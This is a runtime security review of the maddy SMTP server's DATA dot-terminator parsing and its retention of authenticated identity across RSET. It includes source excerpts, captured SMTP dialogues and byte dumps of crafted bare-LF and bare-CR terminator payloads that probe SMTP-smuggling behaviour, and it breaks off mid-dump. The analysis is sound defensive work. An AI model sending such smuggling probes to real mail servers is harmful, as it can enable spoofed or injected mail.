# maddy SMTP Server — Runtime-Evidenced Security Review

**Repository:** `github.com/foxcpp/maddy` at commit `26452dd8dd787dc455278b0fdd296f4a5432c768` (`go.mod`: `module github.com/foxcpp/maddy` [go.mod:L1], `go 1.13` [go.mod:L3]).
**Method:** every behavioral claim below was produced by **building and running maddy** and capturing the real SMTP dialogue bytes, the structured `io_debug`/log lines, the on-disk queue artifacts (`.body`/`.header`/`.meta`), the `{auth_user}` check capture, and the downstream SASL relay bytes. Source `file:line` citations accompany each claim; anything not directly observed is explicitly labelled *inferred*. All runtime scaffolding lives outside the tracked tree and is removed afterward (§8.5); the only repository artifact created is this document.

## 1. Scope and the two questions

Two independent questions are answered in full, each with every named sub-part:

- **Q1 — DATA / message-boundary (dot-terminator) handling.** A message body contains normal content, then a line with only a dot, then more data before the *final* terminator. Does maddy stop at the first dot, keep consuming, or land in an unexpected state? What runtime signs show which path ran? What ends up stored/queued? (§4)
- **Q2 — Authentication identity across transactions.** A client authenticates as user A, begins a message, `RSET`s, then sends `MAIL FROM:<B>` **without re-authenticating**. Does maddy reject it, tie it back to A, or blur accountability? When delivery decisions are made, what evidence shows which identity was trusted for **headers**, **queue metadata**, and **enforcement checks**? (§5)

### 1.1 Direct answers (up front)

**Q1 — direct answer.** maddy **stops reading at the first line that contains only a dot**; it does not keep consuming the body past it. The boundary is not decided by maddy's own code — it is delegated to the Go standard library's `net/textproto` dot reader, reached through the `go-smtp` DATA handler. The decisive runtime signs are: the `354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>` continuation, exactly one `accepted` log line per bare-dot boundary carrying a `msg_id`, and the stored `.body` truncated at that first dot. What ends up stored is **only the bytes before the first bare-dot line**, with leading-dot un-stuffing applied and CRLF normalised to LF. Bytes that follow the first bare-dot line are **not** absorbed into the message and **not** silently discarded — they are handed back to the SMTP command loop and parsed as **new commands** (the SMTP-smuggling-relevant behaviour, fully evidenced in §4.4 and §4.5). One important nuance for the fail-safe judgement: the terminator match is **lenient toward a bare `LF`** (`\n.\n` terminates just like `\r\n.\r\n`) but **strict toward a bare `CR`** (`\r.\r` never terminates; the connection ends in a `554` after EOF and nothing is stored).

**Q2 — direct answer.** maddy **ties the transaction back to the original authenticated identity A and never re-scopes it on `RSET`**, yet it **accepts the mismatched `MAIL FROM:<B>` at the command layer** (a `250` reply). The authenticated identity is connection-scoped and set exactly once when the session is created [internal/endpoint/smtp/smtp.go:L680]; neither the `go-smtp` reset nor maddy's `Session.Reset`/`abort` clears it [internal/endpoint/smtp/smtp.go:L60-L81, github.com/emersion/go-smtp/conn.go:L694-L702], and `Session.Mail` performs no envelope-versus-auth comparison [internal/endpoint/smtp/smtp.go:L162-L179]. The consequence is that identity A remains trusted **in memory** for every downstream decision in the same transaction — the acceptance log (`username=A`), the `{auth_user}` external check (`A`), the DKIM signer (which *refuses to sign* because header `From:B` differs from auth `A`), and the credential relay to the next hop (SASL PLAIN carrying **A**) — while the envelope sender **B** is what appears in the `Received` header and the on-disk queue metadata. Critically, the authenticated identity **A is absent from the persisted `.meta`** because the queue nulls the connection state before serialising [internal/target/queue/queue.go:L752], so **on-disk accountability records the envelope (B), not the authenticated principal (A)**. The default reaction to the mismatch is **signature-withholding, not rejection**; domain-level routing (`default_source { reject 501 5.1.8 "Non-local sender domain" }`) is a **separate** gate keyed on the envelope-sender *domain*, not on the identity mismatch (§5.5).

**Fails-safe verdict (summary; full rationale in §7).** Split by axis: (a) **message-boundary framing** is fail-safe in the RFC 5321 sense for the canonical `<CR><LF>.<CR><LF>` case and *fail-closed* for a bare `CR`, but is **lenient (not strict/fail-closed) for a bare `LF`**, which is the exact leniency that the 2023-2024 SMTP-smuggling class of issues turns on; (b) **live authentication enforcement** fails safe — the identity is pinned for the whole connection and every in-memory consumer sees A, and a cross-identity `From` causes the signer to withhold rather than mis-attribute; (c) **persisted accountability is incomplete** — the authenticated principal is not written to the queue metadata, so post-hoc attribution from disk alone cannot distinguish which login sent a message.


## 2. Environment and canonical build

The **build and toolchain are canonical/default**; the **runtime observation harness is a disclosed scratch configuration** (not maddy's shipped default) — the two are kept distinct here so no observed value is mistaken for a shipped default.

**Toolchain (canonical, matches `go.mod`'s `go 1.13`):**
```text
$ go version
go version go1.13.15 linux/amd64
```
**Canonical build (real entry point `cmd/maddy`, no cgo via `nopam nosqlite3`):**
```text
$ go build -tags 'nopam nosqlite3' -o /tmp/maddy-bin ./cmd/maddy ; echo "exit=$?"
exit=0

$ stat -c '%s bytes' /tmp/maddy-bin
18859700 bytes

$ /tmp/maddy-bin -v
maddy unknown (built from source tree)
```
The banner reads `maddy unknown (built from source tree)` because a plain `go build` does not VCS-stamp the version; packaging scripts inject it via linker flags. This value is therefore the **canonical default-build** banner. `-debug` is required to emit the `io_debug` protocol dialogue used as evidence below.

The message-size limit advertised at runtime (`SIZE 33554432` = 32 MiB, §3) is the shipped default `max_message_size` of `32*1024*1024` [internal/endpoint/smtp/smtp.go:L561], confirming the harness did not alter it.


## 3. Ephemeral runtime harness (disclosed, non-repository)

To exercise the **real TCP entry point** (not `internal/testutils` and not any debug hook), a minimal instance was run from a scratch config under `/tmp` (removed afterward — §8.5). The harness is deliberately non-default in exactly three disclosed ways, each required to make the behaviour observable, and none of which changes the code paths under test:

1. **`tls off` + `insecure_auth yes`** so AUTH PLAIN and the raw byte dialogue are observable without a TLS layer (the shipped `submission` default binds `tls://0.0.0.0:465` [maddy.conf:L93]; the identical `submission` endpoint code path is exercised here on `:587` to match the user's scenario exactly).
2. **`io_debug yes`** so the SMTP dialogue is logged. maddy itself warns about this at startup — `smtp: I/O debugging is on! It may leak passwords in logs, be careful!` [internal/endpoint/smtp/smtp.go:L605] — which is why the credentials below are **synthetic throwaway** values (§5.2).
3. A local **`smtp_downstream` sink on `127.0.0.1:2525`** that returns `451` (temp-fail) so the queue **keeps** each message on disk (`.body`/`.header`/`.meta`) for inspection, and that logs the **downstream SASL bytes** so the relayed identity is observable.

The `:587` queue uses `auth forward` (relaying SASL credentials downstream); the `:25` queue omits it so unauthenticated port-25 mail is not rejected by the credential-forwarding guard [internal/target/smtp_downstream/sasl.go:L31-L37]. DKIM signing is enabled on the `:587` route so the identity-enforcement decision is observable. The complete harness files are reproduced verbatim in §8.

**Server startup (excerpt from the run):**
```text
smtp: I/O debugging is on! It may leak passwords in logs, be careful!	
smtp: listening on tcp://0.0.0.0:25	
smtp: TLS is disabled, this is insecure configuration and should be used only for testing!	
sign_dkim: generated a new rsa2048 keypair, private key is in dkim_keys/localhost_default.key, TXT record with public key is in dkim_keys/localhost_default.dns,
submission: I/O debugging is on! It may leak passwords in logs, be careful!	
[debug] submission: authentication provider: extauth local_authdb	
submission: listening on tcp://0.0.0.0:587	
submission: authentication over unencrypted connections is allowed, this is insecure configuration and should be used only for testing!	
submission: TLS is disabled, this is insecure configuration and should be used only for testing!	
```
**Connectivity / capability probe (both endpoints), decoded AUTH, and the size advertisement:**
```text
banner (:25): b'220 localhost ESMTP Service Ready\r\n'
EHLO (:25): b'250-Hello client.test\r\n250-PIPELINING\r\n250-8BITMIME\r\n250-ENHANCEDSTATUSCODES\r\n250-SMTPUTF8\r\n250 SIZE 33554432\r\n'
banner (:587): b'220 localhost ESMTP Service Ready\r\n'
EHLO (:587): b'250-Hello client.test\r\n250-PIPELINING\r\n250-8BITMIME\r\n250-ENHANCEDSTATUSCODES\r\n250-AUTH PLAIN\r\n250-SMTPUTF8\r\n250 SIZE 33554432\r\n'
AUTH (:587): b'235 2.0.0 Authentication succeeded\r\n'
```
The `250-AUTH PLAIN` capability appears on `:587` only; both endpoints advertise `250 SIZE 33554432`. The banner `220 localhost ESMTP Service Ready` is emitted by `go-smtp` [github.com/emersion/go-smtp/conn.go:L652].


## 4. Q1 — DATA / message-boundary (dot-terminator) handling

### 4.1 Mechanism: who actually decides the boundary

The boundary decision is **not** maddy code. The `go-smtp` protocol engine writes the `354` continuation and then hands maddy a *reader*, draining anything maddy leaves unread; the reader is Go's standard-library `net/textproto` dot reader. Exact source (unedited):

**`github.com/emersion/go-smtp/conn.go` — `handleData` [conn.go:L498-L522]:**
```go
func (c *Conn) handleData(arg string) {
	if arg != "" {
		c.WriteResponse(501, EnhancedCode{5, 5, 4}, "DATA command should not have any arguments")
		return
	}

	if !c.fromReceived || len(c.recipients) == 0 {
		c.WriteResponse(502, EnhancedCode{5, 5, 1}, "Missing RCPT TO command.")
		return
	}

	// We have recipients, go to accept data
	c.WriteResponse(354, EnhancedCode{2, 0, 0}, "Go ahead. End your data with <CR><LF>.<CR><LF>")

	defer c.reset()

	if c.server.LMTP {
		c.handleDataLMTP()
		return
	}

	r := newDataReader(c)
	code, enhancedCode, msg := toSMTPStatus(c.Session().Data(r))
	io.Copy(ioutil.Discard, r) // Make sure all the data has been consumed
	c.WriteResponse(code, enhancedCode, msg)
```
Three facts fix Q1's answer here: (1) the exact `354` text `Go ahead. End your data with <CR><LF>.<CR><LF>` is emitted at [conn.go:L510] — this is the runtime sign that the DATA phase began; (2) the session's `Data` return is unpacked into **three** values `code, enhancedCode, msg := toSMTPStatus(c.Session().Data(r))` at [conn.go:L520]; (3) immediately after `Data` returns, `io.Copy(ioutil.Discard, r)` at [conn.go:L521] drains any bytes maddy did **not** read — but only up to the reader's own EOF (the first bare-dot line). Because `handleData` is `defer c.reset()` [conn.go:L512] and then returns to the command loop, **any bytes after that EOF remain in the connection buffer and are read as the next command** — the root of §4.4/§4.5.

**`github.com/emersion/go-smtp/data.go` — `newDataReader` [data.go:L51-L62]:**
```go
func newDataReader(c *Conn) io.Reader {
	dr := &dataReader{
		r: c.text.DotReader(),
	}

	if c.server.MaxMessageBytes > 0 {
		dr.limited = true
		dr.n = int64(c.server.MaxMessageBytes)
	}

	return dr
}
```
The reader wraps `c.text.DotReader()` [data.go:L53] and enforces the size limit from `MaxMessageBytes` [data.go:L56] (maddy sets this to 32 MiB — the `SIZE 33554432` seen at EHLO).

**Go stdlib `net/textproto/reader.go` — `DotReader` and its state machine [reader.go:L299-L303, L305-L395]:** this is the component that manifests the behaviour.
```go
func (r *Reader) DotReader() io.Reader {
	r.closeDot()
	r.dot = &dotReader{r: r}
	return r.dot
}
```
```go
type dotReader struct {
	r     *Reader
	state int
}

// Read satisfies reads by decoding dot-encoded data read from d.r.
func (d *dotReader) Read(b []byte) (n int, err error) {
	// Run data through a simple state machine to
	// elide leading dots, rewrite trailing \r\n into \n,
	// and detect ending .\r\n line.
	const (
		stateBeginLine = iota // beginning of line; initial state; must be zero
		stateDot              // read . at beginning of line
		stateDotCR            // read .\r at beginning of line
		stateCR               // read \r (possibly at end of line)
		stateData             // reading data in middle of line
		stateEOF              // reached .\r\n end marker line
	)
	br := d.r.R
	for n < len(b) && d.state != stateEOF {
		var c byte
		c, err = br.ReadByte()
		if err != nil {
			if err == io.EOF {
				err = io.ErrUnexpectedEOF
			}
			break
		}
		switch d.state {
		case stateBeginLine:
			if c == '.' {
				d.state = stateDot
				continue
			}
			if c == '\r' {
				d.state = stateCR
				continue
			}
			d.state = stateData

		case stateDot:
			if c == '\r' {
				d.state = stateDotCR
				continue
			}
			if c == '\n' {
				d.state = stateEOF
				continue
			}
			d.state = stateData

		case stateDotCR:
			if c == '\n' {
				d.state = stateEOF
				continue
			}
			// Not part of .\r\n.
			// Consume leading dot and emit saved \r.
			br.UnreadByte()
			c = '\r'
			d.state = stateData

		case stateCR:
			if c == '\n' {
				d.state = stateBeginLine
				break
			}
			// Not part of \r\n. Emit saved \r
			br.UnreadByte()
			c = '\r'
			d.state = stateData

		case stateData:
			if c == '\r' {
				d.state = stateCR
				continue
			}
			if c == '\n' {
				d.state = stateBeginLine
			}
		}
		b[n] = c
		n++
	}
	if err == nil && d.state == stateEOF {
		err = io.EOF
	}
	if err != nil && d.r.dot == d {
		d.r.dot = nil
	}
	return
```
Reading the state machine against the captured bytes explains **every** Q1 result:
- `stateBeginLine` sees `.` and moves to `stateDot` [reader.go:L335-L337]; sees `\r` and moves to `stateCR` [reader.go:L339-L341].
- **`stateDot` + `\n` => `stateEOF` [reader.go:L350-L352]** — this is why a **bare `LF`** (`.\n`) terminates: a dot at line start immediately followed by a line-feed is treated as end-of-data.
- `stateDot` + `\r` => `stateDotCR` [reader.go:L346-L348], and **`stateDotCR` + `\n` => `stateEOF` [reader.go:L357-L359]** — this is the canonical `<CR><LF>.<CR><LF>` terminator.
- **`stateDotCR` with any other byte does NOT terminate** [reader.go:L361-L365]: it `UnreadByte()`, re-emits the saved `\r`, and drops to `stateData` — so `.\r` followed by a non-`\n` byte is *data*, not a terminator. A **bare `CR`** body (`\r.\r`) therefore never produces `stateEOF`; the reader consumes until the socket closes and returns `io.ErrUnexpectedEOF` [reader.go:L328-L330] (the `554` we observe).
- Leading-dot **un-stuffing**: a line beginning `..` enters `stateDot`, the following non-terminator byte drops to `stateData`, and only the second dot onward is emitted — one leading dot is stripped (evidenced in §4.4).
- CRLF is rewritten to `\n` via `stateData`/`stateCR` [reader.go:L378-L384], which is why every stored `.body` shows `\n`, not `\r\n`.

**maddy side** — `Session.Data` reads the header, buffers the body, delivers, and logs `accepted` (the second runtime sign):
```go
func (s *Session) Data(r io.Reader) error {
	bodyCtx, bodyTask := trace.NewTask(s.msgCtx, "DATA")
	defer bodyTask.End()

	wrapErr := func(err error) error {
		s.log.Error("DATA error", err, "msg_id", s.msgMeta.ID)
		return s.endp.wrapErr(s.msgMeta.ID, !s.opts.UTF8, err)
	}

	header, buf, err := s.prepareBody(bodyCtx, r)
	if err != nil {
		return wrapErr(err)
	}

	if err := s.delivery.Body(bodyCtx, header, buf); err != nil {
		return wrapErr(err)
	}

	if err := s.delivery.Commit(bodyCtx); err != nil {
		return wrapErr(err)
	}

	s.log.Msg("accepted", "msg_id", s.msgMeta.ID)

	// go-smtp will call Reset, but it will call Abort if delivery is non-nil.
	s.delivery = nil
	s.msgCtx = nil
	s.msgTask.End()
	s.msgTask = nil
	s.endp.semaphore.Release()

	return nil
}
```
`prepareBody` reads the header [smtp.go:L285], runs submission fix-ups on `:587` [smtp.go:L292], buffers the body in memory via `BufferInMemory` [smtp.go:L298 -> internal/buffer/memory.go:L27], generates the `Received` header from `s.endp.hostname` and the **envelope** `OriginalFrom` [smtp.go:L303 -> internal/target/received.go], and adds it [smtp.go:L307]. On success `s.log.Msg("accepted", "msg_id", s.msgMeta.ID)` fires [smtp.go:L334]; on any read/parse failure the deferred `wrapErr` logs `DATA error` [smtp.go:L317] and returns the `5xx` we see for the bare-`CR` case.

### 4.2 Canonical `<CR><LF>.<CR><LF>` — both ports, both runs

The payload's body tail is `line one\r\nline two\r\n.\r\n` (preceded by the `From`/`To`/`Subject` header shown verbatim in each dialogue capture below). Observed: `354` prompt, exactly one `accepted` msg_id, `250 2.0.0 OK: queued`, and a stored `.body` of exactly `line one\nline two\n` (18 bytes) — the body **before** the dot, CRLF normalised to LF. On `:587` the stored `.header` additionally carries the `Dkim-Signature` (identity matches; see §5) and `DontTraceSender:true`; on `:25` there is no signature and `DontTraceSender:false`. The `.meta` shows `"Conn":null` (see §5.4) and the sink's `451` recorded under `RcptErrs` (which is why the message stays queued for inspection).

**Port 25 — run 1:**
*Wire dialogue* (`canonical_25_run1`):
```text
##### Q1 variant=canonical port=25 #####
banner: b'220 localhost ESMTP Service Ready\r\n'
EHLO: b'250-Hello client.test\r\n250-PIPELINING\r\n250-8BITMIME\r\n250-ENHANCEDSTATUSCODES\r\n250-SMTPUTF8\r\n250 SIZE 33554432\r\n'
MAIL: b'250 2.0.0 Roger, accepting mail from <usera@localhost>\r\n'
RCPT: b"250 2.0.0 I'll make sure <dest@localhost> gets this\r\n"
DATA(354): b'354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>\r\n'
BODY PAYLOAD: b'From: <usera@localhost>\r\nTo: <dest@localhost>\r\nSubject: q1 test\r\n\r\nline one\r\nline two\r\n.\r\n'
POST-DATA: b'250 2.0.0 OK: queued\r\n'
NOOP: b'250 2.0.0 I have sucessfully done nothing\r\n'
QUIT: b'221 2.0.0 Goodnight and good luck\r\n'
```
*Structured log lines* (`canonical_25_run1`):
```text
smtp: incoming message	{"msg_id":"42942189","sender":"usera@localhost","src_host":"client.test","src_ip":"127.0.0.1:51218"}
smtp: accepted	{"msg_id":"42942189"}
[debug] smtp: reset	
queue: will retry	{"attempts_count":1,"msg_id":"42942189","next_try_delay":"14m59.999999292s","rcpts":["dest@localhost"]}
```
*Stored on-disk artifacts* (`canonical_25_run1`):
```text
MSGIDS: 42942189
--- 42942189.body (od -c) ---
0000000   l   i   n   e       o   n   e  \n   l   i   n   e       t   w
0000020   o  \n
0000022
--- 42942189.header ---
Received: from client.test (localhost [127.0.0.1]) by localhost
 (envelope-sender <usera@localhost>) with ESMTP id 42942189; Wed, 08 Jul
 2026 05:38:18 +0000
From: <usera@localhost>
To: <dest@localhost>
Subject: q1 test

--- 42942189.meta ---
{"MsgMeta":{"ID":"42942189","OriginalFrom":"usera@localhost","DontTraceSender":false,"Quarantine":false,"OriginalRcpts":{},"SMTPOpts":{"Size":0,"RequireTLS":false,"UTF8":false},"Conn":null},"From":"usera@localhost","To":["dest@localhost"],"FailedRcpts":null,"TemporaryFailedRcpts":null,"RcptErrs":{"dest@localhost":{"Code":451,"EnhancedCode":[4,0,0],"Message":"Sink temp-fail on purpose (keep queued)"}},"TriesCount":1,"FirstAttempt":"2026-07-08T05:38:17.792758666Z","LastAttempt":"2026-07-08T05:38:18.481745401Z"}
```
**Port 25 — run 2** (byte-identical behaviour; only `msg_id`/`src_ip` differ):
*Wire dialogue* (`canonical_25_run2`):
```text
##### Q1 variant=canonical port=25 #####
banner: b'220 localhost ESMTP Service Ready\r\n'
EHLO: b'250-Hello client.test\r\n250-PIPELINING\r\n250-8BITMIME\r\n250-ENHANCEDSTATUSCODES\r\n250-SMTPUTF8\r\n250 SIZE 33554432\r\n'
MAIL: b'250 2.0.0 Roger, accepting mail from <usera@localhost>\r\n'
RCPT: b"250 2.0.0 I'll make sure <dest@localhost> gets this\r\n"
DATA(354): b'354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>\r\n'
BODY PAYLOAD: b'From: <usera@localhost>\r\nTo: <dest@localhost>\r\nSubject: q1 test\r\n\r\nline one\r\nline two\r\n.\r\n'
POST-DATA: b'250 2.0.0 OK: queued\r\n'
NOOP: b'250 2.0.0 I have sucessfully done nothing\r\n'
QUIT: b'221 2.0.0 Goodnight and good luck\r\n'
```
*Structured log lines* (`canonical_25_run2`):
```text
smtp: incoming message	{"msg_id":"07e9090d","sender":"usera@localhost","src_host":"client.test","src_ip":"127.0.0.1:51226"}
smtp: accepted	{"msg_id":"07e9090d"}
[debug] smtp: reset	
queue: will retry	{"attempts_count":1,"msg_id":"07e9090d","next_try_delay":"14m59.999999132s","rcpts":["dest@localhost"]}
```
*Stored on-disk artifacts* (`canonical_25_run2`):
```text
MSGIDS: 07e9090d
--- 07e9090d.body (od -c) ---
0000000   l   i   n   e       o   n   e  \n   l   i   n   e       t   w
0000020   o  \n
0000022
--- 07e9090d.header ---
Received: from client.test (localhost [127.0.0.1]) by localhost
 (envelope-sender <usera@localhost>) with ESMTP id 07e9090d; Wed, 08 Jul
 2026 05:38:22 +0000
From: <usera@localhost>
To: <dest@localhost>
Subject: q1 test

--- 07e9090d.meta ---
{"MsgMeta":{"ID":"07e9090d","OriginalFrom":"usera@localhost","DontTraceSender":false,"Quarantine":false,"OriginalRcpts":{},"SMTPOpts":{"Size":0,"RequireTLS":false,"UTF8":false},"Conn":null},"From":"usera@localhost","To":["dest@localhost"],"FailedRcpts":null,"TemporaryFailedRcpts":null,"RcptErrs":{"dest@localhost":{"Code":451,"EnhancedCode":[4,0,0],"Message":"Sink temp-fail on purpose (keep queued)"}},"TriesCount":1,"FirstAttempt":"2026-07-08T05:38:22.045131053Z","LastAttempt":"2026-07-08T05:38:22.691760863Z"}
```
**Port 587 — run 1:**
*Wire dialogue* (`canonical_587_run1`):
```text
##### Q1 variant=canonical port=587 #####
banner: b'220 localhost ESMTP Service Ready\r\n'
EHLO: b'250-Hello client.test\r\n250-PIPELINING\r\n250-8BITMIME\r\n250-ENHANCEDSTATUSCODES\r\n250-AUTH PLAIN\r\n250-SMTPUTF8\r\n250 SIZE 33554432\r\n'
AUTH: b'235 2.0.0 Authentication succeeded\r\n'
MAIL: b'250 2.0.0 Roger, accepting mail from <usera@localhost>\r\n'
RCPT: b"250 2.0.0 I'll make sure <dest@localhost> gets this\r\n"
DATA(354): b'354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>\r\n'
BODY PAYLOAD: b'From: <usera@localhost>\r\nTo: <dest@localhost>\r\nSubject: q1 test\r\n\r\nline one\r\nline two\r\n.\r\n'
POST-DATA: b'250 2.0.0 OK: queued\r\n'
NOOP: b'250 2.0.0 I have sucessfully done nothing\r\n'
QUIT: b'221 2.0.0 Goodnight and good luck\r\n'
```
*Structured log lines* (`canonical_587_run1`):
```text
submission: incoming message	{"msg_id":"760af6da","sender":"usera@localhost","src_host":"client.test","src_ip":"127.0.0.1:47076","username":"usera@localhost"}
submission: accepted	{"msg_id":"760af6da"}
[debug] submission: reset	
queue: will retry	{"attempts_count":1,"msg_id":"760af6da","next_try_delay":"14m59.999998516s","rcpts":["dest@localhost"]}
```
*Stored on-disk artifacts* (`canonical_587_run1`):
```text
MSGIDS: 760af6da
--- 760af6da.body (od -c) ---
0000000   l   i   n   e       o   n   e  \n   l   i   n   e       t   w
0000020   o  \n
0000022
--- 760af6da.header ---
Dkim-Signature: a=rsa-sha256;
 bh=ZhLZyUwtqNJUThGINI/HuvcX//8brN5RkpoWZASkH/w=; c=relaxed/relaxed;
 d=localhost;
 h=Subject:Subject:Sender:To:To:Cc:From:From:Date:Date:MIME-Version:Content-Type:Content-Transfer-Encoding:Reply-To:In-Reply-To:Message-Id:Message-Id:References:Autocrypt:Openpgp; i=usera@localhost; s=default; t=1783489107; v=1; x=1783921107; b=Z2/X7WOzvID/zz1hYpxUXoiTYVX5DCSWwpV7uIblUeOjo1xGKfgZNtUcEW0osf7Acgv0sToEs5ePPX6StGzJJs9i7seoQ01/gFdRcuaiI+hOhActnsXRunB2Lh5q4qHbxnv5z4OCaH+OZ81YvKKM+uQGtdNIjls6Ie4uiyL3QlQ44pRiyStvQ4TOW7N2p1CpZRsmcBlZB2KC7M42UAtUyX0YqEmuHViXHdOnhaUSttuIftHNLxLP3PpcR5/2gRjbB8oYJrg85ZL8+JJEirVMFhLCamvVA4DCpJTUZ5oTQxsLRw/EMp5yylbm1IdkehR9nexNp6mGRQ9/RuAYJw+G4g==;
Received:  by localhost (envelope-sender <usera@localhost>) with ESMTP id
 760af6da; Wed, 08 Jul 2026 05:38:27 +0000
Date: Wed, 8 Jul 2026 05:38:27 +0000
Message-Id: <2e76a680-ba0b-46bf-95ec-8c9c9f929567@localhost>
From: <usera@localhost>
To: <dest@localhost>
Subject: q1 test

--- 760af6da.meta ---
{"MsgMeta":{"ID":"760af6da","OriginalFrom":"usera@localhost","DontTraceSender":true,"Quarantine":false,"OriginalRcpts":{},"SMTPOpts":{"Size":0,"RequireTLS":false,"UTF8":false},"Conn":null},"From":"usera@localhost","To":["dest@localhost"],"FailedRcpts":null,"TemporaryFailedRcpts":null,"RcptErrs":{"dest@localhost":{"Code":451,"EnhancedCode":[4,0,0],"Message":"Sink temp-fail on purpose (keep queued)"}},"TriesCount":1,"FirstAttempt":"2026-07-08T05:38:26.513253315Z","LastAttempt":"2026-07-08T05:38:27.206967218Z"}
```
**Port 587 — run 2:**
*Wire dialogue* (`canonical_587_run2`):
```text
##### Q1 variant=canonical port=587 #####
banner: b'220 localhost ESMTP Service Ready\r\n'
EHLO: b'250-Hello client.test\r\n250-PIPELINING\r\n250-8BITMIME\r\n250-ENHANCEDSTATUSCODES\r\n250-AUTH PLAIN\r\n250-SMTPUTF8\r\n250 SIZE 33554432\r\n'
AUTH: b'235 2.0.0 Authentication succeeded\r\n'
MAIL: b'250 2.0.0 Roger, accepting mail from <usera@localhost>\r\n'
RCPT: b"250 2.0.0 I'll make sure <dest@localhost> gets this\r\n"
DATA(354): b'354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>\r\n'
BODY PAYLOAD: b'From: <usera@localhost>\r\nTo: <dest@localhost>\r\nSubject: q1 test\r\n\r\nline one\r\nline two\r\n.\r\n'
POST-DATA: b'250 2.0.0 OK: queued\r\n'
NOOP: b'250 2.0.0 I have sucessfully done nothing\r\n'
QUIT: b'221 2.0.0 Goodnight and good luck\r\n'
```
*Structured log lines* (`canonical_587_run2`):
```text
submission: incoming message	{"msg_id":"c82233ae","sender":"usera@localhost","src_host":"client.test","src_ip":"127.0.0.1:47084","username":"usera@localhost"}
submission: accepted	{"msg_id":"c82233ae"}
[debug] submission: reset	
queue: will retry	{"attempts_count":1,"msg_id":"c82233ae","next_try_delay":"14m59.999999179s","rcpts":["dest@localhost"]}
```
*Stored on-disk artifacts* (`canonical_587_run2`):
```text
MSGIDS: c82233ae
--- c82233ae.body (od -c) ---
0000000   l   i   n   e       o   n   e  \n   l   i   n   e       t   w
0000020   o  \n
0000022
--- c82233ae.header ---
Dkim-Signature: a=rsa-sha256;
 bh=ZhLZyUwtqNJUThGINI/HuvcX//8brN5RkpoWZASkH/w=; c=relaxed/relaxed;
 d=localhost;
 h=Subject:Subject:Sender:To:To:Cc:From:From:Date:Date:MIME-Version:Content-Type:Content-Transfer-Encoding:Reply-To:In-Reply-To:Message-Id:Message-Id:References:Autocrypt:Openpgp; i=usera@localhost; s=default; t=1783489111; v=1; x=1783921111; b=FQqs8p3ADGKsQaMYT/92CWOQOQcvk9/vqx1rdvDxFlXzweJXH++MN5Ng+lW2fPG/rMbLcQPpYgwxViwI68MmKMQR/BNiI85RAyXRpbqgbiTyEscfkuqwwRWsicLrqhRvpL1f8uvFtZXeOmp0kXHvkAxnFZLTOh0aQ6AgI5iMwwYZ86Jvbk9arlyTJQxYF2odDlmL1Z6afo6j8V1TzQ7pt36Dgc3u3PgFAoyGefNT013/j+PVh9Rc3MrBYSWMvlmLUfy6v9CG9CWkH+w9RAmei6Zuzu0M+uUNM/Cm5wXfZNppD4FQBymxl9cOZvB33ugriuZtbZ6/GhNyhMz6cis8ug==;
Received:  by localhost (envelope-sender <usera@localhost>) with ESMTP id
 c82233ae; Wed, 08 Jul 2026 05:38:31 +0000
Date: Wed, 8 Jul 2026 05:38:31 +0000
Message-Id: <1665e377-7973-4399-860d-bd941c1912ea@localhost>
From: <usera@localhost>
To: <dest@localhost>
Subject: q1 test

--- c82233ae.meta ---
{"MsgMeta":{"ID":"c82233ae","OriginalFrom":"usera@localhost","DontTraceSender":true,"Quarantine":false,"OriginalRcpts":{},"SMTPOpts":{"Size":0,"RequireTLS":false,"UTF8":false},"Conn":null},"From":"usera@localhost","To":["dest@localhost"],"FailedRcpts":null,"TemporaryFailedRcpts":null,"RcptErrs":{"dest@localhost":{"Code":451,"EnhancedCode":[4,0,0],"Message":"Sink temp-fail on purpose (keep queued)"}},"TriesCount":1,"FirstAttempt":"2026-07-08T05:38:31.031450142Z","LastAttempt":"2026-07-08T05:38:31.696942551Z"}
```

### 4.3 Non-standard terminators: bare `LF` (lenient) vs bare `CR` (strict) — with exact bytes

This is the pair that decides the smuggling posture. The **only** difference between these two payloads and the canonical one is the line ending around the dot; the byte dumps below prove exactly which bytes were sent.
*Exact transmitted DATA payload* `canonical` — canonical `\r\n.\r\n` terminator (last bytes `6f 0d 0a 2e 0d 0a`):
`od -c`:
```text
0000000   F   r   o   m   :       <   u   s   e   r   a   @   l   o   c
0000020   a   l   h   o   s   t   >  \r  \n   T   o   :       <   d   e
0000040   s   t   @   l   o   c   a   l   h   o   s   t   >  \r  \n   S
0000060   u   b   j   e   c   t   :       q   1       t   e   s   t  \r
0000100  \n  \r  \n   l   i   n   e       o   n   e  \r  \n   l   i   n
0000120   e       t   w   o  \r  \n   .  \r  \n
0000132
```
`od -An -tx1` (hex):
```text
 46 72 6f 6d 3a 20 3c 75 73 65 72 61 40 6c 6f 63
 61 6c 68 6f 73 74 3e 0d 0a 54 6f 3a 20 3c 64 65
 73 74 40 6c 6f 63 61 6c 68 6f 73 74 3e 0d 0a 53
 75 62 6a 65 63 74 3a 20 71 31 20 74 65 73 74 0d
 0a 0d 0a 6c 69 6e 65 20 6f 6e 65 0d 0a 6c 69 6e
 65 20 74 77 6f 0d 0a 2e 0d 0a
```
*Exact transmitted DATA payload* `bare_lf` — bare-`LF` `\n.\n` terminator (last bytes `6f 0a 2e 0a`):
`od -c`:
```text
0000000   F   r   o   m   :       <   u   s   e   r   a   @   l   o   c
0000020   a   l   h   o   s   t   >  \r  \n   T   o   :       <   d   e
0000040   s   t   @   l   o   c   a   l   h   o   s   t   >  \r  \n   S
0000060   u   b   j   e   c   t   :       q   1       t   e   s   t  \r
0000100  \n  \r  \n   l   i   n   e       o   n   e  \n   l   i   n   e
0000120       t   w   o  \n   .  \n
0000127
```
`od -An -tx1` (hex):
```text
 46 72 6f 6d 3a 20 3c 75 73 65 72 61 40 6c 6f 63
 61 6c 68 6f 73 74 3e 0d 0a 54 6f 3a 20 3c 64 65
 73 74 40 6c 6f 63 61 6c 68 6f 73 74 3e 0d 0a 53
 75 62 6a 65 63 74 3a 20 71 31 20 74 65 73 74 0d
 0a 0d 0a 6c 69 6e 65 20 6f 6e 65 0a 6c 69 6e 65
 20 74 77 6f 0a 2e 0a
```
*Exact transmitted DATA payload* `bare_cr` — bare-`CR` `\r.\r` (last bytes `6f 0d 2e 0d`; note: no `0a` at all):
`od -c`:
```text
0000000   F   r   o   m   :       <   u   s   e   r   a   @   l   o   c
